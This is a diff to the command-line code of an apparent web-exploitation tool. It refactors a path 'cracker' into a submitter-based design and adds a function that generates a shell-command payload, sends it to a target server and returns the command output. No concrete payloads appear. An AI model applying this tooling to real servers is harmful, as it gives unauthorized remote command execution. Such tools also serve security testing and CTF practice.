@@ -12,7 +12,8 @@ import click
 
 from .form import get_form
 from .form_cracker import FormCracker
-from .path_cracker import PathCracker
+from .cracker import Cracker
+from .submitter import Submitter, PathSubmitter
 from .full_payload_gen import FullPayloadGen
 from .scan_url import yield_form
 from .requester import Requester
@@ -47,9 +48,38 @@ logging.basicConfig(level=logging.INFO, format=LOGGING_FORMAT)
 logger = logging.getLogger("cli")
 
 
+def cmd_exec_submitter(
+    cmd: str, submitter: Submitter, full_payload_gen: FullPayloadGen
+) -> str:
+    """使用FullPayloadGen生成shell命令payload, 然后使用submitter发送至对应服务器, 返回回显
+
+    Args:
+        cmd (str): payload对应的命令
+        submitter (Submitter): 实际发送请求的submitter
+        full_payload_gen (FullPayloadGen): 生成payload的FullPayloadGen
+
+    Returns:
+        str: 回显
+    """
+    payload, will_print = full_payload_gen.generate(OS_POPEN_READ, cmd)
+    if payload is None:
+        logger.warning("%s generating payload.", colored("red", "Failed"))
+        return ""
+    logger.info("Submit payload %s", colored("blue", payload))
+    if not will_print:
+        payload_wont_print = (
+            "Payload generator says that this "
+            + "payload %s command execution result."
+        )
+        logger.warning(payload_wont_print, colored("red", "won't print"))
+    result = submitter.submit(payload)
+    assert result is not None
+    return result.text
+
+
 def cmd_exec(
     cmd: str,
-    cracker: Union[FormCracker, PathCracker],
+    cracker: FormCracker,
     field: Union[str, None],
     full_payload_gen: FullPayloadGen,
 ):
@@ -288,17 +318,15 @@ def crack_path(
             headers_list=list(header), cookies=cookies
         ),
     )
-    cracker = PathCracker(
-        url=url, requester=requester, detect_mode=detect_mode
-    )
+    submitter = PathSubmitter(url=url, requester=requester)
+    cracker = Cracker(submitter=submitter, detect_mode=detect_mode)
     full_payload_gen = cracker.crack()
     if full_payload_gen is None:
         logger.warning("Test form failed...")
         return
     cmd_exec_func = partial(
-        cmd_exec,
-        cracker=cracker,
-        field=None,
+        cmd_exec_submitter,
+        submitter=submitter,
         full_payload_gen=full_payload_gen,
     )
     if exec_cmd == "":
